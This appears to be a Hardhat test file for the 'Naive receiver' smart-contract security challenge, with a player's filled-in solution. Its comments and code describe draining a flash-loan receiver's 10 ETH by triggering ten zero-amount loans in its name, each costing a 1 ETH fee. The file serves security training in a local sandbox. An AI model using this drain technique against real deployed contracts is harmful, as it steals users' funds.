const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Naive receiver', function () {
    let deployer, user, player;
    let pool, receiver;

    // Pool has 1000 ETH in balance
    const ETHER_IN_POOL = 1000n * 10n ** 18n;

    // Receiver has 10 ETH in balance
    const ETHER_IN_RECEIVER = 10n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, user, player] = await ethers.getSigners();

        const LenderPoolFactory = await ethers.getContractFactory('NaiveReceiverLenderPool', deployer);
        const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);
        
        pool = await LenderPoolFactory.deploy();
        await deployer.sendTransaction({ to: pool.address, value: ETHER_IN_POOL });
        const ETH = await pool.ETH();
        
        expect(await ethers.provider.getBalance(pool.address)).to.be.equal(ETHER_IN_POOL);
        expect(await pool.maxFlashLoan(ETH)).to.eq(ETHER_IN_POOL);
        expect(await pool.flashFee(ETH, 0)).to.eq(10n ** 18n);

        receiver = await FlashLoanReceiverFactory.deploy(pool.address);
        await deployer.sendTransaction({ to: receiver.address, value: ETHER_IN_RECEIVER });
        await expect(
            receiver.onFlashLoan(deployer.address, ETH, ETHER_IN_RECEIVER, 10n**18n, "0x")
        ).to.be.reverted;
        expect(
            await ethers.provider.getBalance(receiver.address)
        ).to.eq(ETHER_IN_RECEIVER);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        const ETH = await pool.ETH();
        
        // Henryk Exploit Plan:
        // 1. Create an attacker smart contract which has the address of the 
        // Pool and the victim that implemented IERC3156FlashBorrower.
        // 2. Execute a flash loan of 0 amount 10 times. The victim smart contract 
        // pays back the full amount plus the Pool fee of 1 ether. Calling this 10 
        // times will then effectively drain the 10 ether that the victim had.
        // 3. That's it! In conclusion, by only having the address of a smart 
        // contract that interacts with this Pool (the victim), I can drain the 
        // victim because the Pool doesn't take precautions to check who is executing the flash loan.
        // Note that "victim" is synonymous with "receiver"/"victimReceiver" in the code

        const NaiveAttackerFactory = await ethers.getContractFactory("NaiveAttacker", player);

        // Henryk: Deploying this alone will activate the attack since I do
        // the attack in the constructor
        await NaiveAttackerFactory.deploy(pool.address, ETH, receiver.address);

        // Henry: Another way to do it the Javascript code 
        // and not in a single transaction like I did in the NaiveAttacker.sol
        // smart contract. The above code for dpeloying NaiveAttacker.sol would need
        // to be commented out
        
        // for(var i =0; i< 10; i++) {
        //     await pool.connect(player).flashLoan(receiver.address, ETH, 0, new TextEncoder().encode(""))
        // }

        expect(await pool.connect(player).flashFee(ETH, 0)).to.be.equal(10n ** 18n)
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // All ETH has been drained from the receiver
        expect(
            await ethers.provider.getBalance(receiver.address)
        ).to.be.equal(0);
        expect(
            await ethers.provider.getBalance(pool.address)
        ).to.be.equal(ETHER_IN_POOL + ETHER_IN_RECEIVER);
    });
});
